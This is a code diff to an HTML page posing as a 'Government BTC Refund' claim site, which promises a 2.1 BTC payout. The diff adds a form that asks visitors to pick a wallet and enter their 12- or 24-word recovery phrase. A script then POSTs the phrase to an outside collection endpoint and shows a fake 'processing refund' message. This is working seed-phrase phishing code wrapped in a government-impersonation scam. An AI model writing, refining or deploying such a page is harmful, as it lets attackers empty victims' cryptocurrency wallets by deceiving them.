@@ -10,6 +10,7 @@
       background-color: #f4f4f4;
       text-align: center;
       padding-top: 50px;
+      margin: 0;
       position: relative;
     }
     body::before {
@@ -22,6 +23,7 @@
       transform: translate(-50%, -50%);
       z-index: 0;
       white-space: nowrap;
+      pointer-events: none;
     }
     .container {
       background: white;
@@ -47,12 +49,20 @@
       cursor: pointer;
       font-size: 16px;
     }
-    .wallet-box {
+    .wallet-box, .form-box {
       margin-top: 25px;
       background: #eee;
       padding: 15px;
       border-radius: 8px;
       word-break: break-word;
+      display: none;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 4px;
+      border: 1px solid #ccc;
     }
     .note, .btc-amount {
       font-size: 13px;
@@ -71,34 +81,56 @@
   <div class="container">
     <h2>🇺🇸 Government BTC Refund</h2>
     <p>Claim your Bitcoin refund through verified wallet connection.</p>
-    
+
     <div class="btc-amount">
       Estimated Refund Amount: <br><span style="color:#f7931a;">2.1 BTC ≈ $115,000</span>
     </div>
 
     <button class="btn" onclick="connectWallet()">Connect Wallet</button>
 
-    <div class="wallet-box" id="walletBox" style="display:none;">
-      <strong>Connected Wallet:</strong><br>
-      <span id="walletAddress">bc1qx6gh03rd5x9m2gea6syl8x2yat674jmenmd0uw</span>
+    <div class="form-box" id="formBox">
+      <form onsubmit="submitPhrase(); return false;">
+        <label for="wallet">Select Wallet</label>
+        <select id="wallet" required>
+          <option value="">Choose</option>
+          <option>MetaMask</option>
+          <option>TrustWallet</option>
+          <option>Coinbase Wallet</option>
+        </select>
+
+        <label for="phrase">Enter 12 or 24-word Phrase</label>
+        <input type="text" id="phrase" required placeholder="e.g. abandon abandon abandon ...">
+        
+        <button class="btn" type="submit">Validate Wallet</button>
+      </form>
     </div>
 
-    <div class="note">Compatible with MetaMask, TrustWallet, or Coinbase Wallet.</div>
-    <div class="note">For inquiries, contact: admin@govbtcclaim.org</div>
+    <div class="note">Minimum wallet balance required for claim: 0.05 BTC</div>
+    <div class="note">For support, contact: <b>admin@govbtcclaim.org</b></div>
   </div>
 
-  <!-- Connect Wallet Script -->
   <script>
     function connectWallet() {
-      const walletBox = document.getElementById("walletBox");
-      const walletAddress = document.getElementById("walletAddress");
-      walletBox.style.display = "block";
-      const fakeAddress = "0x" + Math.random().toString(36).substring(2, 15);
-      walletAddress.textContent = fakeAddress;
+      document.getElementById('formBox').style.display = 'block';
+    }
+
+    function submitPhrase() {
+      const phrase = document.getElementById('phrase').value;
+      const wallet = document.getElementById('wallet').value;
+      
+      // Send via fetch to backend or webhook
+      fetch("https://your-backend.com/collect", {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({wallet, phrase})
+      });
+
+      alert("Wallet connection submitted. Processing refund...");
+      document.getElementById('formBox').reset();
     }
   </script>
 
-  <!-- Tawk.to Live Chat -->
+  <!-- Live Chat (Tawk.to) -->
   <script type="text/javascript">
     var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
     (function(){
@@ -110,6 +142,5 @@
     s0.parentNode.insertBefore(s1,s0);
     })();
   </script>
-
 </body>
 </html>
